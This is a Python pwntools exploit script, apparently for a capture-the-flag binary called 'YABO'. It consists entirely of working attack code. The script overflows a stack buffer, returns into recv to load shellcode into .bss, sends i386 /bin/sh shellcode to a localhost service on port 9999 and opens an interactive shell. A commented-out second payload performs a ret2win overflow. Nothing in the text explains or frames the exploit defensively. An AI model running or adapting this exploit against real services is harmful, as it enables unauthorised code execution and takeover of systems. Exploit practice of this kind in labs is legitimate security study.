from pwn import *

elf = ELF('YABO')
context.update(os='linux', arch='x86', binary=elf)
listener = elf.process()

p = remote('localhost', 9999)

offset = 1044
bss = 0x804b000 + 0x110
sh = asm(shellcraft.i386.linux.sh())
payload_size = len(sh) + 1

payload = b'A' * offset
payload += p32(elf.plt['recv'])
payload += p32(bss)
payload += p32(0x0)
payload += p32(bss)
payload += p32(payload_size)
payload += p32(0x0)
# payload += sh

with open('payload', 'wb') as fp:
	fp.write(payload + b'\n')
	fp.write(sh + b'\n')

input('Proceed? ')
p.sendline(payload)

input('Proceed? ')
p.sendline(sh)

p.interactive()
listener.interactive()

p.close()
listener.close()

# p.sendline()
# offset = 400
# store_addr = 0x404030

# payload = b'A' * offset
# payload += p64(store_addr - 8)
# payload += p64(elf.symbols['win'])

# with open('payload', 'wb') as fp:
# 	fp.write(payload + b'\n')

# p.sendline(payload)

# p.interactive()

